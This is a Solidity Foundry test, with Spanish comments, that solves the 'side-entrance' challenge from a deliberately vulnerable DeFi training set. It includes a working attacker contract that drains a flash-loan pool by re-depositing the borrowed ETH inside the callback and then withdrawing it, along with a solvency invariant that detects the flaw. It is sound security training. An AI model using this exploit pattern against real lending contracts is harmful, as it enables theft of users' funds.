// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";

/*
 * NEXUS Offensive · training/dvd · reto "side-entrance"
 *
 * CLASE DE BUG: condición de repago confundida con solvencia (reentrada lateral).
 *   `flashLoan` solo verifica que el BALANCE del pool se restaure. El atacante
 *   restaura el balance... depositándolo con `deposit()` dentro del callback, lo
 *   que le acredita un saldo retirable. Luego retira y vacía el pool.
 *
 * FAMILIA: Flash loan pool (solvencia).
 *
 * INVARIANTE QUE LO ATRAPA (REUSA el concepto de SOLVENCIA de Capa 2 —
 *   Lending L1/L3, Vault V3): "custodia >= pasivos".
 *   `address(pool).balance >= Σ balances[u]`. Se sostiene al inicio
 *   (1000 >= 1000) y se rompe cuando el depósito del atacante queda respaldado
 *   por el propio préstamo (pasivos 2000 > balance 1000). El VECTOR
 *   (reentrada vía deposit) es nuevo; la invariante es reutilizable.
 */
contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /// @notice INVARIANTE (solvencia, reusada): balance del pool >= pasivos.
    function _invariant_solvent(address attacker) internal view returns (bool) {
        uint256 liabilities = pool.balances(deployer) + pool.balances(player) + pool.balances(attacker);
        return address(pool).balance >= liabilities;
    }

    function test_sideEntrance() public checkSolvedByPlayer {
        SideEntranceAttacker attacker = new SideEntranceAttacker(pool, recovery);

        // La invariante de solvencia se sostiene antes del exploit.
        assertTrue(_invariant_solvent(address(attacker)), "INV debe sostenerse al inicio");

        attacker.attack(ETHER_IN_POOL);

        // Tras el exploit el pool está vacío pero aún "debe" saldos → insolvente.
        assertFalse(_invariant_solvent(address(attacker)), "INV rota: pool insolvente");
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

/// @notice Atacante de side-entrance: pide prestado y re-deposita en el callback.
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount); // dispara execute(): re-depositamos lo prestado
        pool.withdraw(); // retiramos el saldo que nos acreditó
        (bool ok,) = recovery.call{value: address(this).balance}("");
        require(ok, "send failed");
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
